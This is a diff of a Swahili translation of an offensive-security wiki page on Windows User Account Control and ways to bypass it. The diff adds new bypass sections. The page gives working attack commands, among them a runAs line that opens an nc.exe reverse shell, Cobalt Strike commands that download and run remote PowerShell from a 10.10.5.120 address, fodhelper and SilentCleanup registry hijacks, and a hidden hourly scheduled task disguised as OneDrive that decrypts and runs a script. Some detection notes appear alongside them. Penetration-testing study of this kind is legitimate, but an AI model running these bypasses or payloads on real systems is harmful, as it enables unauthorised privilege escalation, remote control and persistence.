@@ -4,18 +4,18 @@
 
 ## UAC
 
-[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **consent prompt kwa elevated activities**. Applications zina viwango tofauti vya `integrity`, na program yenye **high level** inaweza kufanya kazi ambazo **zinaweza kwa potenciali ku-compromise system**. UAC ikiwa imewezeshwa, applications na tasks daima **zina-run chini ya security context ya account isiyo ya administrator** isipokuwa administrator aidhinishe waziwazi applications/tasks hizi ziwe na administrator-level access kwenye system ili zi-run. Ni kipengele cha urahisi kinachowalinda administrators dhidi ya mabadiliko yasiyokusudiwa lakini hakizingatiwi kuwa security boundary.
+[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **ombi la idhini kwa shughuli zilizoinuliwa**. Applications zina viwango tofauti vya `integrity`, na program yenye **kiwango cha juu** inaweza kutekeleza kazi ambazo **zinaweza kuhatarisha mfumo**. UAC inapowashwa, applications na tasks kila mara **huendeshwa chini ya muktadha wa usalama wa akaunti isiyo ya administrator** isipokuwa administrator aidhinishe wazi applications/tasks hizo kupata ufikiaji wa kiwango cha administrator kwenye mfumo ili ziendeshwe. Ni kipengele cha urahisi kinachowalinda administrators dhidi ya mabadiliko yasiyokusudiwa, lakini hakichukuliwi kuwa security boundary.
 
-Kwa maelezo zaidi kuhusu integrity levels:
+Kwa maelezo zaidi kuhusu viwango vya integrity:
 
 
 {{#ref}}
 ../windows-local-privilege-escalation/integrity-levels.md
 {{#endref}}
 
-Wakati UAC ipo, administrator user hupewa tokens 2: standard user key, ya kufanya actions za kawaida kama regular level, na moja yenye admin privileges.
+UAC inapowekwa, mtumiaji wa administrator hupewa tokens 2: token ya standard user, kwa kutekeleza vitendo vya kawaida katika medium integrity, na nyingine yenye privileges za admin.
 
-Hili [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) linajadili kwa kina jinsi UAC inavyofanya kazi na linajumuisha logon process, user experience, na UAC architecture. Administrators wanaweza kutumia security policies kusanidi jinsi UAC inavyofanya kazi mahsusi kwa organization yao katika local level (kwa kutumia secpol.msc), au kusanidiwa na kusukumwa kupitia Group Policy Objects (GPO) ndani ya Active Directory domain environment. Settings mbalimbali zinajadiliwa kwa undani [hapa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Kuna Group Policy settings 10 zinazoweza kuwekwa kwa UAC. Jedwali lifuatalo linatoa maelezo ya ziada:
+[Ukurasa huu](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) unaeleza kwa kina jinsi UAC inavyofanya kazi na unajumuisha mchakato wa logon, user experience, na UAC architecture. Administrators wanaweza kutumia security policies kusanidi jinsi UAC inavyofanya kazi kulingana na mahitaji ya organization yao katika kiwango cha local (kwa kutumia secpol.msc), au kusanidi na kusambaza kupitia Group Policy Objects (GPO) katika mazingira ya Active Directory domain. Settings mbalimbali zimejadiliwa kwa kina [hapa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Kuna settings 10 za Group Policy zinazoweza kuwekwa kwa UAC. Jedwali lifuatalo lina maelezo ya ziada:
 
 | Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
 | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
@@ -30,32 +30,32 @@ Hili [page](https://docs.microsoft.com/en-us/windows/security/identity-protectio
 | [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
 | [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |
 
-### Policies for installing software on Windows
+### Policies za kusakinisha software kwenye Windows
 
-**local security policies** ("secpol.msc" kwenye systems nyingi) zimesanidiwa kwa default **kuzuia non-admin users kufanya software installations**. Hii ina maana kwamba hata kama non-admin user anaweza kupakua installer ya software yako, hataweza kui-run bila admin account.
+**local security policies** ("secpol.msc" kwenye systems nyingi) husanidiwa kwa default ili **kuwazuia users wasio-admin kusakinisha software**. Hii inamaanisha kwamba hata kama user asiye-admin anaweza kupakua installer ya software yako, hataweza kuiendesha bila akaunti ya admin.
 
-### Registry Keys to Force UAC to Ask for Elevation
+### Registry Keys za Kulazimisha UAC Kuomba Elevation
 
-As a standard user with no admin rights, unaweza kuhakikisha kwamba account ya "standard" **inaombwa credentials na UAC** inapojaribu kufanya actions fulani. Action hii ingebidi irekebishe baadhi ya **registry keys**, ambazo unahitaji admin permissions kuzibadilisha, isipokuwa kuwe na **UAC bypass**, au attacker tayari ameingia kama admin.
+Ukiwa standard user asiye na admin rights, unaweza kuhakikisha kwamba akaunti ya "standard" **inaombwa credentials na UAC** inapojaribu kutekeleza actions fulani. Kitendo hiki kitahitaji kurekebisha **registry keys** fulani, ambazo zinahitaji admin permissions, isipokuwa kuwe na **UAC bypass**, au attacker awe tayari amelogin kama admin.
 
-Hata kama user yuko katika group la **Administrators**, mabadiliko haya humlazimisha user **kuingiza tena credentials za account yake** ili kufanya administrative actions.
+Hata kama user yuko katika group la **Administrators**, mabadiliko haya humlazimisha user **kuingiza tena credentials za akaunti yake** ili kutekeleza administrative actions.
 
-**Kikwazo pekee ni kwamba mbinu hii inahitaji UAC iwe disabled ili ifanye kazi, jambo ambalo si la kawaida katika production environments.**
+**Kwa vitendo, hii ni muhimu tu ikiwa tayari una elevated token, UAC bypass, au misconfiguration inayokuruhusu kubadilisha keys hizi; vinginevyo registry write yenyewe itazuiwa.**
 
-Registry keys na entries unazopaswa kubadilisha ni zifuatazo (zikiwa na default values ndani ya mabano):
+Registry keys na entries unazopaswa kubadilisha ni zifuatazo (pamoja na default values kwenye mabano):
 
 - `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
 - `ConsentPromptBehaviorUser` = 1 (3)
 - `ConsentPromptBehaviorAdmin` = 1 (5)
 - `PromptOnSecureDesktop` = 1 (1)
 
-Hili pia linaweza kufanywa manually kupitia Local Security Policy tool. Baada ya kubadilishwa, administrative operations humprompt user kuingiza tena credentials zake.
+Hili pia linaweza kufanywa manually kupitia Local Security Policy tool. Baada ya kubadilishwa, administrative operations humlazimisha user kuingiza tena credentials zake.
 
 ### Note
 
-**User Account Control si security boundary.** Kwa hiyo, standard users hawawezi kutoka nje ya accounts zao na kupata administrator rights bila local privilege escalation exploit.
+**User Account Control si security boundary.** Kwa hiyo, standard users hawawezi kutoka kwenye accounts zao na kupata administrator rights bila local privilege escalation exploit.
 
-### Ask for 'full computer access' to a user
+### Muombe user 'full computer access'
 ```powershell
 hostname | Set-Clipboard
 Enable-PSRemoting -SkipNetworkProfileCheck -Force
@@ -66,12 +66,12 @@ Enter-PSSession -ComputerName hostname
 ```
 ### UAC Privileges
 
-- Internet Explorer Protected Mode hutumia integrity checks ili kuzuia processes za high-integrity-level (kama web browsers) kufikia data za low-integrity-level (kama temporary Internet files folder). Hii hufanywa kwa kuendesha browser na low-integrity token. Wakati browser inapojaribu kufikia data iliyohifadhiwa kwenye low-integrity zone, operating system hukagua integrity level ya process na huruhusu access kulingana na hilo. Feature hii husaidia kuzuia attacks za remote code execution zisipate access kwa sensitive data kwenye system.
-- Wakati user anapo log on to Windows, system huunda access token inayobeba list ya privileges za user huyo. Privileges hufafanuliwa kama mchanganyiko wa rights na capabilities za user. Token pia hubeba list ya credentials za user, ambazo ni credentials zinazotumika kum authenticate user kwa computer na kwa resources kwenye network.
+- Internet Explorer Protected Mode hutumia ukaguzi wa integrity kuzuia michakato yenye kiwango cha juu cha integrity (kama web browsers) kufikia data yenye kiwango cha chini cha integrity (kama folda ya temporary Internet files). Hili hufanywa kwa kuendesha browser kwa kutumia low-integrity token. Browser inapojaribu kufikia data iliyohifadhiwa katika low-integrity zone, operating system hukagua kiwango cha integrity cha mchakato na kuruhusu access ipasavyo. Kipengele hiki husaidia kuzuia mashambulizi ya remote code execution kupata access kwa data nyeti iliyo kwenye mfumo.
+- Mtumiaji anapoingia kwenye Windows, mfumo huunda access token yenye orodha ya privileges za mtumiaji. Privileges hufafanuliwa kama mchanganyiko wa rights na capabilities za mtumiaji. Token pia huwa na orodha ya credentials za mtumiaji, ambazo hutumika kumthibitisha mtumiaji kwa computer na resources zilizo kwenye network.
 
 ### Autoadminlogon
 
-Ili kusanidi Windows ili i-log on automatically user maalum wakati wa startup, weka **`AutoAdminLogon` registry key**. Hii ni muhimu kwa kiosk environments au kwa testing purposes. Tumia hii tu kwenye systems salama, kwa sababu huonyesha password kwenye registry.
+Ili kusanidi Windows iingie kiotomatiki kwa mtumiaji maalum wakati wa startup, weka **`AutoAdminLogon` registry key**. Hii ni muhimu kwa mazingira ya kiosk au kwa madhumuni ya testing. Tumia hii kwenye secure systems pekee, kwa sababu inaweka password wazi kwenye registry.
 
 Weka keys zifuatazo ukitumia Registry Editor au `reg add`:
 
@@ -80,20 +80,36 @@ Weka keys zifuatazo ukitumia Registry Editor au `reg add`:
 - `DefaultUsername` = username
 - `DefaultPassword` = password
 
-Ili kurudisha normal logon behavior, weka `AutoAdminLogon` kuwa 0.
+Ili kurejesha tabia ya kawaida ya logon, weka `AutoAdminLogon` kuwa 0.
 
 ## UAC bypass
 
 > [!TIP]
-> Kumbuka kwamba ikiwa una graphical access kwa victim, UAC bypass ni straight forward kwa sababu unaweza tu kubofya "Yes" wakati UAC prompt inaonekana
+> Kumbuka kwamba ikiwa una graphical access kwa victim, UAC bypass ni rahisi, kwa kuwa unaweza kubofya tu "Yes" UAC prompt inapoonekana
 
-UAC bypass inahitajika katika hali ifuatayo: **UAC imeanzishwa, process yako inaendeshwa katika medium integrity context, na user wako ni wa group la administrators**.
+UAC bypass inahitajika katika hali ifuatayo: **UAC imewashwa, process yako inaendeshwa katika medium integrity context, na user wako ni wa administrators group**.
 
-Ni muhimu kutaja kwamba ni **ngumu zaidi sana bypass UAC ikiwa iko kwenye highest security level (Always) kuliko ikiwa iko kwenye levels nyingine zozote (Default).**
+Ni muhimu kutaja kwamba ni **vigumu zaidi kubypass UAC ikiwa iko kwenye kiwango cha juu zaidi cha security (Always) kuliko ikiwa iko kwenye viwango vingine (Default).**
 
-### UAC disabled
+### Fast triage from a medium-integrity shell
 
-Ikiwa UAC tayari imezimwa (`ConsentPromptBehaviorAdmin` ni **`0`**) unaweza **kutekeleza reverse shell yenye admin privileges** (high integrity level) ukitumia kitu kama:
+Kabla ya kujaribu bypass, thibitisha kuwa uko kwenye scenario sahihi na linganisha host build na methods zinazojulikana kufanya kazi:
+```powershell
+whoami /groups
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
+powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
+schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
+```
+Vidokezo vya vitendo:
+- Ikiwa `EnableLUA=0`, huhitaji bypass: token yoyote ya admin inaweza kuomba high integrity moja kwa moja.
+- `ConsentPromptBehaviorAdmin=2` au `5` ndiyo hali ya kawaida kwa auto-elevate / COM-based bypasses.
+- `Always Notify` huongeza kiwango cha ulinzi, lakini bado unapaswa kujaribu build halisi badala ya kudhani kuwa itashindwa: UACME bado inafuatilia baadhi ya mbinu zinazoendana na `AlwaysNotify` kwenye Windows builds za kisasa.
+
+### UAC ikiwa imezimwa
+
+Ikiwa UAC tayari imezimwa (`ConsentPromptBehaviorAdmin` ni **`0`), unaweza **kutekeleza reverse shell yenye haki za admin** (high integrity level) kwa kutumia kitu kama:
 ```bash
 #Put your reverse shell instead of "calc.exe"
 Start-Process powershell -Verb runAs "calc.exe"
@@ -104,12 +120,12 @@ Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10
 - [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
 - [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)
 
-### **Very** Basic UAC "bypass" (full file system access)
+### **Very** Basic UAC "bypass" (ufikiaji kamili wa mfumo wa faili)
 
-Ikiwa una shell na mtumiaji ambaye yuko ndani ya group la Administrators unaweza **mount the C$** lililosambazwa kupitia SMB (file system) local kwenye disk mpya na utakuwa na **access to everything inside the file system** (hata folda ya nyumbani ya Administrator).
+Ikiwa una shell yenye user aliye ndani ya group la Administrators, unaweza **mount C$** iliyoshirikiwa kupitia SMB (mfumo wa faili) locally kama disk mpya na utakuwa na **access ya kila kitu ndani ya mfumo wa faili** (hata folder la nyumbani la Administrator).
 
 > [!WARNING]
-> **Inaonekana kama hila hii haifanyi kazi tena**
+> **Inaonekana kama trick hii haifanyi kazi tena**
 ```bash
 net use Z: \\127.0.0.1\c$
 cd C$
@@ -119,7 +135,7 @@ dir \\127.0.0.1\c$\Users\Administrator\Desktop
 ```
 ### UAC bypass with cobalt strike
 
-Mbinu za Cobalt Strike zitafanya kazi tu ikiwa UAC haijawekwa katika kiwango chake cha juu cha usalama
+Mbinu za Cobalt Strike zitafanya kazi tu ikiwa UAC haijawekwa kwenye kiwango chake cha juu zaidi cha usalama
 ```bash
 # UAC bypass via token duplication
 elevate uac-token-duplication [listener_name]
@@ -131,18 +147,27 @@ runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-obj
 # Bypass UAC with CMSTPLUA COM interface
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 ```
-**Empire** na **Metasploit** pia zina moduli kadhaa za **bypass** ya **UAC**.
+**Empire** na **Metasploit** pia zina modules kadhaa za **bypass** ya **UAC**.
+
+### Interfaces za COM zilizoinuliwa (`ICMLuaUtil` / `CMSTPLUA`)
+
+COM objects zinazojielevate zinasalia kuwa UAC surface ya vitendo kwenye builds za kisasa. `ICMLuaUtil` bado inafuatiliwa na UACME kama inayofanya kazi kwenye Windows branches za sasa, na offensive tooling inaendelea kuibadilisha `CMSTPLUA` kwa kuchanganya process ya interactive desktop, execution ya 64-bit, na wakati mwingine PEB/process masquerading kabla ya kuita COM Elevation Moniker.
+
+Vidokezo vya vitendo:
+- Pendelea process ya **64-bit** iliyo kwenye **interactive session** ya mtumiaji (mara nyingi `explorer.exe` au child wake).
+- Ikiwa raw shell itashindwa, jaribu tena kutoka kwa BOF / UACME implementation badala ya naive `CreateProcess` wrapper.
+- Tarajia child execution kufanyika katika **separate elevated process**; BOF nyingi haziinui beacon ya sasa in-place.
 
 ### KRBUACBypass
 
-Documentation na tool iko katika [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
+Documentation na tool zinapatikana kwenye [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
 
 ### UAC bypass exploits
 
-[**UACME** ](https://github.com/hfiref0x/UACME) ambayo ni **compilation** ya exploits kadhaa za UAC bypass. Kumbuka kuwa utahitaji **compile UACME ukitumia visual studio au msbuild**. Compilation itatengeneza executables kadhaa (kama `Source\Akagi\outout\x64\Debug\Akagi.exe`) , utahitaji kujua **ni ipi unayohitaji.**\
-Unapaswa **kuwa mwangalifu** kwa sababu baadhi ya bypasses zitaweza **kudokeza baadhi ya programs nyingine** ambazo zitaweza **kumuonya** **user** kwamba kuna kitu kinatokea.
+[**UACME** ](https://github.com/hfiref0x/UACME)ambayo ni **compilation** ya UAC bypass exploits kadhaa. Kumbuka kwamba utahitaji **ku-compile UACME kwa kutumia visual studio au msbuild**. Compilation itaunda executables kadhaa (kama `Source\Akagi\outout\x64\Debug\Akagi.exe`) , utahitaji kujua **ni ipi unayohitaji.**\
+Unapaswa **kuwa mwangalifu** kwa sababu baadhi ya bypasses zita-**promtp** baadhi ya **programs** nyingine ambazo zitam-**alert** **user** kwamba kuna kitu kinaendelea.
 
-UACME ina **build version kutoka ambayo kila technique ilianza kufanya kazi**. Unaweza kutafuta technique inayogusa versions zako:
+UACME ina **build version ambayo kila technique ilianza kufanya kazi**. Unaweza kutafuta technique inayoathiri versions zako:
 ```powershell
 PS C:\> [environment]::OSVersion.Version
 
@@ -150,18 +175,26 @@ Major  Minor  Build  Revision
 -----  -----  -----  --------
 10     0      14393  0
 ```
-Pia, kwa kutumia [hii](https://en.wikipedia.org/wiki/Windows_10_version_history) ukurasa unapata Windows release `1607` kutoka kwa build versions.
+Pia, ukitumia ukurasa [huu](https://en.wikipedia.org/wiki/Windows_10_version_history) unapata toleo la Windows `1607` kutoka kwenye matoleo ya build.
+
+Mtiririko wa kazi wa vitendo ni kwanza **kupima build ya host**, kisha tu kuendesha method inayolingana:
+```cmd
+python main.py --scan uac
+Akagi64.exe 33 C:\Windows\System32\cmd.exe
+```
+- `WinPwnage` hulinganisha haraka build ya ndani na UAC methods zake zinazojulikana, jambo linalosaidia kuondoa haraka PoCs zilizokufa.
+- `UACME` bado ni catalogue bora ya umma ya kuhusisha bypass na build mahususi. Matoleo ya hivi karibuni yaliongeza methods mpya na kujaribu tena zilizokuwepo dhidi ya **Windows 11 25H2**, kwa hiyo kagua tena README/release notes kabla ya kudhani kuwa blog post ya zamani bado inatumika bila mabadiliko.
 
 ### UAC Bypass – fodhelper.exe (Registry hijack)
 
-Binary inayoaminika `fodhelper.exe` ina auto-elevated kwenye Windows za kisasa. Inapoanzishwa, huuliza per-user registry path hapa chini bila kuthibitisha verb ya `DelegateExecute`. Kuweka command hapo kunaruhusu process ya Medium Integrity (user yuko kwenye Administrators) kuanzisha process ya High Integrity bila UAC prompt.
+Binary inayoaminika `fodhelper.exe` hujiinua kiotomatiki kwenye Windows za kisasa. Inapozinduliwa, huuliza registry path ya kila mtumiaji iliyo hapa chini bila kuthibitisha verb ya `DelegateExecute`. Kuweka command hapo humwezesha process yenye Medium Integrity (mtumiaji yuko kwenye Administrators) kuzindua process yenye High Integrity bila UAC prompt.
 
-Registry path queried by fodhelper:
+Registry path inayoulizwa na fodhelper:
 ```text
 HKCU\Software\Classes\ms-settings\Shell\Open\command
 ```
 <details>
-<summary>Hatua za PowerShell (weka payload yako, kisha anzisha)</summary>
+<summary>Hatua za PowerShell (weka payload yako, kisha trigger)</summary>
 ```powershell
 # Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
 C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"
@@ -181,14 +214,14 @@ Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"
 Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
 ```
 </details>
-Notes:
-- Hufanya kazi wakati mtumiaji wa sasa ni mwanachama wa Administrators na kiwango cha UAC ni default/lenient (sio Always Notify with extra restrictions).
-- Tumia njia ya `sysnative` kuanzisha 64-bit PowerShell kutoka kwa 32-bit process kwenye 64-bit Windows.
-- Payload inaweza kuwa amri yoyote (PowerShell, cmd, au njia ya EXE). Epuka kuonyesha UIs kwa stealth.
+Maelezo:
+- Hufanya kazi wakati mtumiaji wa sasa ni mwanachama wa Administrators na kiwango cha UAC ni cha default/lenient (si Always Notify yenye restrictions za ziada).
+- Tumia njia ya `sysnative` kuanzisha PowerShell ya 64-bit kutoka kwenye process ya 32-bit kwenye Windows ya 64-bit.
+- Payload inaweza kuwa command yoyote (PowerShell, cmd, au njia ya EXE). Epuka UI zinazoomba mwingiliano kwa ajili ya stealth.
 
 #### CurVer/extension hijack variant (HKCU only)
 
-Recent samples abusing `fodhelper.exe` avoid `DelegateExecute` and instead **redirect the `ms-settings` ProgID** via the per-user `CurVer` value. The auto-elevated binary still resolves the handler under `HKCU`, so no admin token is needed to plant the keys:
+Recent samples zinazotumia vibaya `fodhelper.exe` huepuka `DelegateExecute` na badala yake **huelekeza upya ProgID ya `ms-settings`** kupitia value ya `CurVer` ya kila mtumiaji. Binary ya auto-elevated bado hutatua handler chini ya `HKCU`, kwa hiyo admin token haihitajiki ili kupanda keys:
 ```powershell
 # Point ms-settings to a custom extension (.thm) and map that extension to our payload
 New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
@@ -197,55 +230,65 @@ Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Valu
 
 Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
 ```
-Mara baada ya kupandishwa kiwango, malware kwa kawaida **huzima future prompts** kwa kuweka `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` kuwa `0`, kisha hufanya additional defense evasion (k.m., `Add-MpPreference -ExclusionPath C:\ProgramData`) na huunda upya persistence ili iendeshwe kama high integrity. Kazi ya kawaida ya persistence huhifadhi **XOR-encrypted PowerShell script** kwenye disk na hui-decode/hui-execute in-memory kila saa:
+Baada ya kupata privileges zilizoinuliwa, **malware kwa kawaida huzima prompts za baadaye** kwa kuweka `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` kuwa `0`, kisha hufanya defense evasion ya ziada (kwa mfano, `Add-MpPreference -ExclusionPath C:\ProgramData`) na kuunda upya persistence ili iendeshe kwa high integrity. Kazi ya kawaida ya persistence huhifadhi **PowerShell script iliyosimbwa kwa XOR** kwenye diski na kuidecode na kuiendesha in-memory kila saa:
 ```powershell
 schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
 ```
-Variante hii bado husafisha dropper na huacha tu staged payloads, hivyo detection inategemea kufuatilia **`CurVer` hijack**, `ConsentPromptBehaviorAdmin` tampering, kuundwa kwa Defender exclusion, au scheduled tasks ambazo hufanya PowerShell decrypt in-memory.
+Toleo hili bado husafisha dropper na kuacha staged payloads pekee, hivyo detection hutegemea kufuatilia **`CurVer` hijack**, uchezewaji wa `ConsentPromptBehaviorAdmin`, uundaji wa Defender exclusion, au scheduled tasks zinazo-decrypt PowerShell in-memory.
+
+### UAC bypass kupitia task ya `SilentCleanup` (`HKCU\Environment\windir`)
+
+`SilentCleanup` huzindua `cleanmgr.exe` ikiwa na highest privileges na hupanua `%windir%` kutoka kwenye user environment. Ukidhibiti `HKCU\Environment\windir`, unaweza kuelekeza upanuzi huo kwenye command yoyote na kupata high integrity bila consent dialog. Njia hii bado inafaa kujaribiwa kwenye builds za hivi karibuni kwa sababu UACME inaendelea kuweka technique hii ikiwa active, na ufuatiliaji wa issues za hivi karibuni unaonyesha kuwa Windows 11 24H2 huenda ikahitaji marekebisho madogo tu ya quoting.
+```cmd
+reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
+schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
+reg delete "HKCU\Environment" /v windir /f
+```
+Ikiwa task inataja path kwenye build hiyo, jaribu tena kwa payload inayoishia na alama ya nukuu (kwa mfano `cmd.exe"`). Kila mara safisha `HKCU\Environment\windir` baada ya kufanya majaribio.
 
 #### More UAC bypass
 
-**Mbinu zote** zinazotumiwa hapa kupita AUC **zinahitaji** **full interactive shell** na victim (shell ya kawaida ya nc.exe haitoshi).
+More UAC bypass nyingi za kawaida zinazotumia vibaya UI flows, COM objects, au desktop interaction zinahitaji **full interactive session** na victim; shell ya kawaida ya `nc.exe` au service inayoendesha katika **Session 0** mara nyingi haitoshi.
 
-Unaweza kuipata kwa kutumia session ya **meterpreter**. Hamisha kwenda kwenye **process** yenye thamani ya **Session** sawa na **1**:
+Mara nyingi unaweza kutatua hilo kwa kutumia session ya **meterpreter**. Migrate kwenda kwenye **process** yenye thamani ya **Session** iliyo sawa na **1**:
 
-![](<../../images/image (863).png>)
+![Elekeza ms-settings kwenye custom extension (.thm) na uhusishe extension hiyo na payload yetu - More UAC bypass: Unaweza kupata hii kwa kutumia meterpreter session. Migrate kwenda kwenye process yenye Session...](<../../images/image (863).png>)
 
-(_explorer.exe_ should works)
+(_explorer.exe_ inapaswa kufanya kazi)
 
 ### UAC Bypass with GUI
 
-Kama una access ya **GUI unaweza tu kukubali UAC prompt** unapopata hiyo, huhitaji kweli bypass. Kwa hiyo, kupata access ya GUI kutakuwezesha kupita UAC.
+Ikiwa una access ya **GUI**, unaweza tu kukubali UAC prompt inapoonekana; kwa kweli huhitaji technical bypass. Kwa hivyo, kupata GUI session mara nyingi hutosha kuondoa kikwazo cha kiutendaji kinachoongezwa na UAC.
 
-Zaidi ya hayo, ukipata GUI session ambayo mtu alikuwa anaitumia (huenda kupitia RDP) kuna **tools kadhaa ambazo zitakuwa zikiendeshwa kama administrator** ambazo unaweza **ku-run** `cmd` kwa mfano **as admin** moja kwa moja bila kuombwa tena na UAC kama [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Hii inaweza kuwa zaidi **stealthy**.
+Zaidi ya hayo, ukipata GUI session ambayo mtu alikuwa akiitumia (huenda kupitia RDP), kuna **baadhi ya tools zitakazoendeshwa kama administrator** ambazo unaweza kutumia **kuendesha** **cmd**, kwa mfano **kama admin**, moja kwa moja bila kuulizwa tena na UAC, kama [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Hii inaweza kuwa na **stealth** zaidi.
 
 ### Noisy brute-force UAC bypass
 
-Kama haujali kuwa noisy unaweza kila wakati **ku-run kitu kama** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) ambacho **huomba kuinua permissions hadi user akubali**.
+Ikiwa hujali kuwa noisy, unaweza kila mara **kuendesha kitu kama** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) ambacho **huomba permissions za juu hadi user akubali**.
 
 ### Your own bypass - Basic UAC bypass methodology
 
-Ukiangalia **UACME** utaona kwamba **UAC bypasses nyingi hutumia vibaya vulnerability ya Dll Hijacking** (hasa kuandika malicious dll kwenye _C:\Windows\System32_). [Soma hiki kujifunza jinsi ya kupata Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).
+Ukiangalia **UACME**, utaona kwamba **UAC bypasses nyingi hutumia vibaya DLL hijacking** (mara nyingi kwa kufanya binary iliyo elevated ipakie DLL inayodhibitiwa na attacker kutoka kwenye writable path). [Soma hii ili ujifunze jinsi ya kupata vulnerability ya DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).
 
-1. Pata binary ambayo ita **autoelevate** (angalia kwamba inapotekelezwa inaendesha kwenye high integrity level).
-2. Kwa procmon pata events za "**NAME NOT FOUND**" ambazo zinaweza kuwa vulnerable kwa **DLL Hijacking**.
-3. Huenda ukahitaji **kuandika** DLL ndani ya baadhi ya **protected paths** (kama C:\Windows\System32) ambazo huna permissions za kuandika. Unaweza kupita hili kwa kutumia:
-1. **wusa.exe**: Windows 7,8 na 8.1. Inaruhusu kutoa content ya CAB file ndani ya protected paths (kwa sababu tool hii inatekelezwa kutoka high integrity level).
+1. Tafuta binary inayofanya **autoelevate** (hakikisha kwamba inapotekelezwa inaendeshwa katika high integrity level).
+2. Kwa kutumia procmon, tafuta events za "**NAME NOT FOUND**" ambazo zinaweza kuwa vulnerable kwa **DLL Hijacking**.
+3. Huenda ukahitaji **kuandika** DLL ndani ya **protected paths** (kama C:\Windows\System32) ambako huna writing permissions. Unaweza kukwepa hili kwa kutumia:
+1. **wusa.exe**: Windows 7,8 na 8.1. Inakuruhusu kutoa content ya CAB file ndani ya protected paths (kwa sababu tool hii hutekelezwa kutoka kwenye high integrity level).
 2. **IFileOperation**: Windows 10.
-4. Tayarisha **script** ya kunakili DLL yako ndani ya protected path na kutekeleza vulnerable na autoelevated binary.
+4. Andaa **script** ya kunakili DLL yako ndani ya protected path na kutekeleza binary iliyo vulnerable na autoelevated.
 
 ### Another UAC bypass technique
 
-Inajumuisha kuangalia kama **autoElevated binary** inajaribu **kusoma** kutoka kwenye **registry** **jina/path** ya **binary** au **command** itakayokuwa **executed** (hii inavutia zaidi ikiwa binary inatafuta taarifa hii ndani ya **HKCU**).
